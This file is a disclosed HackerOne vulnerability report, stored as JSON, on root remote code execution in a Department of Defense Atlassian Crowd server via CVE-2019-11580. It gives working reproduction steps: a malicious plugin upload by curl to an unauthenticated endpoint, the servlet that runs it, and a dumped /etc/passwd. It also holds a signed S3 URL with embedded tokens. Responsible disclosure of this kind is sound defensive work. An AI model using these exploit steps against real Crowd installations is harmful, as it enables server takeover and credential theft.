@@ -1,0 +1,125 @@
+{
+  "id": 632721,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzI3MjE=",
+  "url": "https://hackerone.com/reports/632721",
+  "title": "Root Remote Code Execution on https://███",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-30T03:11:39.767Z",
+  "submitted_at": "2019-06-30T03:11:39.767Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cdl",
+    "url": "/cdl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-11580"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-04T15:14:59.585Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-14T21:53:57.881Z",
+  "team_member_agreed_on_going_public_at": "2019-10-04T15:14:59.536Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nAtlassian Crowd is a centralized identity management application that allows companies to \"Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location.\"\n\nA DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.\n\n**Description:**\nFrom Atlassian's public [advisory](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html):\n\n> Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.\n\nThere is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the \"pdkinstall\" plugin and I was able to successfully construct a working exploit.\n\n## Step-by-step Reproduction Instructions\n\n1. Download and unzip my malicious plugin: rce-plugin.zip {F519371}\n2. `cd` into the directory\n3. Run the following command:\n```\ncurl -k -H \"Content-Type: multipart/content\" \\\n  --form \"file_cdl=@rce.jar;type=application/octet-stream\" https://███/crowd/admin/uploadplugin.action\n```\n\nYou'll see that the malicious plugin is successfully installed:\n\n```\nInstalled plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar\n```\n\nNow visit https://███████/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command `whoami` which is the user `root`\n\n██████████\n\ncontents of `/etc/passwd`\n\n```\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\n████████x:6:0:██████████/sbin:/sbin/shutdown\n██████x:7:0:███████/sbin:/sbin/halt\n█████████x:8:12:█████/var/spool/████/sbin/nologin\n███x:10:14:███/var/spool/███████/sbin/nologin\n██████x:11:0:██████/root:/sbin/nologin\n██████████x:12:100:███████/usr/████/sbin/nologin\n██████████x:13:30:█████/var/█████/sbin/nologin\n████x:14:50:FTP User:/var/███████/sbin/nologin\n█████████x:99:99:Nobody:/:/sbin/nologin\n██████████x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n██████████x:38:38::/etc/██████/sbin/nologin\n██████████x:499:76:\"Saslauthd user\":/var/empty/██████████/sbin/nologin\n██████████x:47:47::/var/spool/mqueue:/sbin/nologin\n███████x:51:51::/var/spool/mqueue:/sbin/nologin\n████████x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n█████x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n████████x:74:74:Privilege-separated SSH:/var/empty/████████/sbin/nologin\n████████x:81:81:System message bus:/:/sbin/nologin\n███████x:500:500:EC2 Default User:/home/████████/bin/bash\n```\n\n## Product, Version, and Configuration (If applicable)\n```\nCrowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)\nCrowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)\nCrowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)\nCrowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)\nCrowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)\n```\n\n## Suggested Mitigation/Remediation Actions\nI recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.\n\n## Impact\n\nRemote code execution on https://███. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons. \n\n\nSince this is running as root, an attacker could also easily backdoor the login page and steal credentials.\n\nThanks,\nCorben Leo (@cdl)",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 519371,
+      "file_name": "rce-plugin.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/519/371/4446d8ce6ac2802450871abff8a585b2713d6489/rce-plugin.zip?response-content-disposition=attachment%3B%20filename%3D%22rce-plugin.zip%22%3B%20filename%2A%3DUTF-8%27%27rce-plugin.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152126Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f6ffa9ca18a65eb3b61bf789c7c003230f2f1ea3224e2abad000c54de49a79c",
+      "file_size": 5583,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "pomme",
+    "mik317",
+    "null_rhythm",
+    "lumbridge",
+    "05bs001",
+    "intx0x80",
+    "seven6"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
